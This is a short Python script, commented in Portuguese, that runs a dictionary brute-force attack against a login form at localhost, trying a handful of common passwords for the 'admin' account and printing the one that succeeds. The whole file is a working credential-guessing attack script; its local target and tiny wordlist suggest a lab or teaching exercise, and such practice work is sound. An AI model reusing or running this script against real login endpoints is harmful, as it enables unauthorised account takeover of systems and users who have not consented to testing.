import requests

url_login = "http://localhost:8000/login"
usuario_alvo = "admin"

senhas_comuns = ["123456", "senha", "admin", "password", "1234", "582", "583", "584"]

print(f"[*] Iniciando ataque de Força Bruta em: {url_login}")
print(f"[*] Usuário alvo: {usuario_alvo}\n")

encontrada = False

for tentativa in senhas_comuns:
    print(f"Testando senha: {tentativa}")

    dados_login = {
        "username": usuario_alvo,
        "password": tentativa
    }

    try:
        resposta = requests.post(url_login, data=dados_login, timeout=5)

        if resposta.status_code == 200 and "sucesso" in resposta.text.lower():
            print("\n" + "="*40)
            print(f"[+] SENHA ENCONTRADA: {tentativa}")
            print("="*40 + "\n")
            encontrada = True
            break

    except requests.exceptions.RequestException as e:
        print(f"[!] Erro na conexão: {e}")
        break

if not encontrada:
    print("\n[!] Fim do ataque. Senha não encontrada na wordlist.")
